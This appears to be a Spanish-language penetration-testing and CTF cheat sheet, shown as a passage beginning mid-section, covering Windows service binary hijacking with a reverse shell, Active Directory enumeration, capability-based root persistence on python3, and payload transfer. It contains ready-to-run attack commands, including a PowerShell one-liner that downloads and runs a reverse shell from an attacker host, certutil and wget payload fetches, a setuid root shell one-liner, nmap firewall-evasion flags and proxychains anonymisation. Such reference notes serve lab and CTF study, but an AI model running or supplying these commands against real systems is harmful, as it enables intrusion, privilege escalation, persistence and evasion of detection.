# Ver que cualquiera tiene permiso de RW. Proceder a cambiar el .exe por nuestro reverse
	copy C:\Users\user\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
# Kali
	nc -lvnp 4444
# Target
	net stop filepermsvc   ---   en caso de necesitar parar el servicio
	net start filepermsvc


ACTIVE DIRECTORY
_________________________________________________________________________________________

# https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html
	crackmapexec smb [rango_IP]   ---   realizar peticiones smb para descubrir equipos del dominio
	crackmapexec smb [rango_IP] -u '' -p '' --shares   ---   enumerar carpetas compartidas en los equipos con un user anonimo
	crackmapexec smb [rango_IP] -u 'user' -p 'password' --shares   ---   enumerar carpetas compartidas en los equipos con un user autenticado
	crackmapexec smb [IP_DC] -u 'user' -p 'password' --groups   ---   enumerar grupos en los equipos con un user autenticado
	crackmapexec smb [IP_DC] -u 'user' -p 'password' --users   ---   enumerar usuarios en los equipos con un user autenticado
	crackmapexec smb [IP_DC] --pass-pol   ---   enumerar politica contraseñas del dominio
	bloodhound-python -u user -p password -d dominio.local -c All   ---   sacar información del dominio para verla con bloodhound
	ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)"   ---   descubrir el DC por medio de ldap


PERSISTENCE
_________________________________________________________________________________________

# CAPABILITIES # Metodo de persistencia, solo desde ROOT, escalamos privilegios colocando una capability 
# Filtrar en https://gtfobins.github.io/ por capabilities y comprobar si estan instalados
	which python3 
		/usr/bin/python3
# Siguiendo las intrucciones de gtfobins  
	setcap cap_setuid+ep /usr/bin/python3
# PUEDE FALLAR # Seguir este paso si no lo ejecuta, si no, pasar al siguiente
	readlink -f /usr/bin/python3
		/usr/bin/python3.8
	setcap cap_setuid+ep /usr/bin//usr/bin/python3.8
# Ahora solo hay que introducir el siguiente, y escalara privilegios otra vez
	python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'


EXTRACT CREDENTIALS
_________________________________________________________________________________________















PIVOTING
_________________________________________________________________________________________


TRATAMIENTO DE IMAGENES
_________________________________________________________________________________________

exiftool imagen.png   ---   sacar datos exif de una imagen
strings imagen.png   ---   sacar los strings, texto, datos ocultos de una imagen


BORRAR HUELLAS
_________________________________________________________________________________________

#


===========================
===   IMPORTANT TOOLS   ===
===========================


FIND FLAGS 
_________________________________________________________________________________________

# Linux
	find / -type f -name "*.txt"
	find / -type f -name "flag.txt"
	find / -type f -name "user.txt"
	find / -type f -name "root.txt"

# Windows
	dir C:\ /s /b | find "user.txt"
	dir C:\ /s /b | find "flag.txt"
	dir C:\ /s /b | find "root.txt"


FILE TRANSFER 
_________________________________________________________________________________________

# Kali crear un servidos web
	sudo python3 -m http.server 8080
	sudo python3 -m SimpleHTTPServer 8080
	sudo python3 smbserver.py [PUT_NAME] /[PATH] 
	ex: smbserver.py reverse /home/kali/Downloads

# Target Linux
	wget http://[IP]:[PORT]/[FILE]
	ex: wget http://10.10.120.64:8080/LinPEAS.sh
         
# Target Windows
	curl -O http://[IP]:[PORT]/[FILE]
	certutil.exe -f -urlcache -split "http://[LHOST]/[FILE]" [FILE]
	powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
	Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
	powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
	powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
	copy \\IP\recurso

# ¡RECUERDA! Añadir el permiso de ejecucion.
	chmod +x [FILE]


COMPILAR C
_________________________________________________________________________________________

# Linux
	gcc program.c –o executable.exe
	gcc 37929.c -o xploit

# Windows
	i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe


TTY 
_________________________________________________________________________________________

# Linux
	Bash
# 1.-
	script /dev/null -c bash
	ctrl+z
	stty raw -echo; fg
	reset xterm
	export TERM=xterm
	export SHELL=bash
	stty rows 52 columns 180
# 2.-
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	export TERM=screen-256color
	[Ctrl + z]
	echo $TERM
	stty raw -echo; fg
	export TERM=xterm-256color
# 3.-
	oneliner: stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
# 4.-
	script -q /dev/null -c bash
	/usr/bin/script -qc /bin/bash /dev/null

# Windows
	https://github.com/antonioCoco/ConPtyShell


VIRTUAL ENVIRONMENT
_________________________________________________________________________________________

# Para evitar conflictos entre configuraciones y librerias de Python
# Ir a la ubicacion del proyecto o herramienta y crear entorno virtual myenv
	python3 -m venv myenv
# Activar el entorno
	source myenv/bin/activate
# Instalar los paquetes
	ex: pip install -r requirements.txt
# Desactivar el entorno virtual
	deactivate


===========================
===    SETTING  KALI    ===
===========================


KALI TOOLS
_________________________________________________________________________________________

# Actualizar e instalar todas la herramientas de Kali Linux
	sudo apt update && sudo apt install kali-tools-*
	sudo apt update && sudo apt upgrade -y


ALIAS
_________________________________________________________________________________________

# Crear alias para agilizar trabajo
	echo "$SHELL"
		/bin/bash	nano ~/.bashrc
		/bin/zsh	nano ~/.zshrc
		/bin/fish	nano ~/.config/fish/config.fish
	sudo nano ~/.zshrc
# Introducir alias
	alias upy="sudo apt update && sudo apt upgrade -y"
	Ctrl+O (guarda) y enter
	Ctrl+X (cierra)
		/bin/bash	source ~/.bashrc
		/bin/zsh	source ~/.zshrc
		/bin/fish	source ~/.config/fish/config.fish


ANONYMITY
_________________________________________________________________________________________

# Lanzar el comando para la instalación de Tor
	sudo apt update
	sudo apt install tor
	sudo apt install tor torbrowser-launcher -y
# Arrancar el servicio de Tor y comprobar su estado
	sudo service tor start
	sudo service tor status   ---   tiene que estar activo
# Editar /etc/proxychains4.conf
	sudo nano /etc/proxychains4.conf   o   sudo nano /etc/proxychains.conf

	dynamic_chain
	#strict_chain
	.
	socks4  127.0.0.1 9050
	socks5  127.0.0.1 9050

Ctrl O + enter
Ctrl X

# Ya puedes hacer comandos en anonimo
	sudo proxychains nmap -vv -sT -Pn -n -sV -O <IP>
	sudo proxychains dirb <HOST> <WORDLISTS>
	proxychains firefox https://www.upgradehub.com/
	sudo proxychains nikto –h <HOST>
# Entrar en https://ipleak.net/
	Si esta vacio: "Your IP addresses - WebRTC detection"
# Abrir otra pestaña y escribir:
	about:config
	media.peerconnection.enabled	FALSE
# Refrescar https://ipleak.net/ debe salir: "No leak, RTCPeerConnection not available."


===========================
===     COMMAND ATT     ===
===========================

_________________________________________________________________________________________

# arp-scan # Enumera los host que hay en la red. 
-I			[interfaz] para indicar el interfaz si fuese necesario
-g			ignora los duplicados
_________________________________________________________________________________________

# nmap # Enumera los puertos abiertos, solo los 1000 mas comunes.
-vv			lista mientras se ejecuta
-sV			detecta servicios y versiones 
-p-			comprueba todos los puertos
-p[PORT]		escanea el puerto indicado
-sC			lanza scripts
-Pn			desactiva las solicitudes de eco ICMP
-n			desactiva la resolución DNS
-sn			desactiva el escaneo de puertos
--disable-arp-ping	desactiva escaneo de ping ARP
--script		elegir un script para utilizar.
	locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u   ---   muestra las categorias
		ex: nmap -p[PUERTO] [IP] --script="categoria"
	listar scripts:
		ls -lh /usr/share/nmap/scripts/
		ls -lh /usr/share/nmap/scripts/*ssh*
	ex: nmap -vv -sV -p445 --script smb-vuln-cve2009-3103.nse [RHOST]   ---   usa ese script
	ex: nmap -vv -sV -p445 --script vuln [RHOST]   ---   usa todos los scripts con "vuln"
	ex: nmap -vv -sV -p445 --script smb-vuln-* [RHOST]   ---   usa solo los que empiezen por "smb-vuln-"
-oN [NAME]		guarda los resultados en txt
-oX [NAME]		guarda los resultados en xml
-T0 a -T5		velocidad del scaneo T3 es la velocidad estandar (-T5 solo entorno controlado)
-A			intenta detectar versiones y SO (solo entorno controlado)


# nmap firewall
--mtu 8 y 16		reduce el tamaño de los paquetes
-f			reduce el tamaño de los paquetes al minimo
--source-port		configura el puerto de origen, imitando la petición desde otro puerto
-D			falsea IPs, enviando paquetes falsos a la red (tu IP va incluida)
--spoof-mac		falsifica la direccion MAC de origen
-sS			realiza escaneo SYN sin establecer una conexion completa
--max-rate		controla la velocidad
_________________________________________________________________________________________

# smbclient # Enumera,modifica,controla los recursos compartidos
-L			lista los recursos compartidos
-N			no pide la contraseña
_________________________________________________________________________________________

# smbclient operations #
dir			lista recursos
prompt off		no pregunta con mget y mput la confirmacion de tranferencia
mget *			copia todos los recursos de la carpeta
get			copia el recurso seleccionado
_________________________________________________________________________________________

# hydra #
-l			si conocemos el usuario
-L			si no conocemos el usuario añaciendo el diccionario a usar
-p			si conocemos la contraseña
-P			si no conocemos la contraseña añaciendo el diccionario a usar
